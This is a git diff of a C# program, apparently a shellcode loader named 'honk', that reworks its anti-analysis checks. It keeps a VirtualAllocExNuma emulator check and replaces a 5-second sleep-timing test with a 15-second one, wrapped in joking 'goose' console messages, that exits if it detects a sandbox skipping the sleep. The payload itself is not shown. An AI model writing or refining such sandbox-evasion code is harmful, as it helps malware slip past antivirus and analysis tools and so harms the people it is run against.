@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -24,16 +24,10 @@ namespace honk
 
         static void Main(string[] args)
         {
+            appleBits();
+
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
-            {
-                return;
-            }
-
-            DateTime t1 = DateTime.Now;
-            Sleep(5000);
-            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-            if (t2 < 4.5)
             {
                 return;
             }
@@ -78,6 +72,37 @@ namespace honk
             catch (Exception ex)
             {
                 Console.WriteLine($"An error occurred: {ex.Message}");
+            }
+        }
+
+        public static void appleBits()
+        {
+            Console.WriteLine("Here you will learn about gooses!");
+            Console.WriteLine("In the digital ponds of cyberspace, the legendary hacker goose is known for its unique ability to \"quack\" through any security system, leaving a trail of digital feathers but never getting caught.");
+            holdYourHorses();
+        }
+
+        static void holdYourHorses()
+        {
+            DateTime startTime = DateTime.Now;
+            Console.WriteLine("Gooses get tiredz...");
+
+            Sleep(15000);
+
+            DateTime endTime = DateTime.Now;
+            TimeSpan duration = endTime - startTime;
+
+            Console.WriteLine($"Gooses woked up after {duration.TotalSeconds} seconds.");
+
+            // Adjust this threshold based on expected variances in timing and execution environments
+            if (duration.TotalSeconds < 15)
+            {
+                Console.WriteLine("Man this beach is so darn sandy :(");
+                Environment.Exit(-1);
+            }
+            else
+            {
+                Console.WriteLine("Mess with the Honk get the Bonk!");
             }
         }
     }
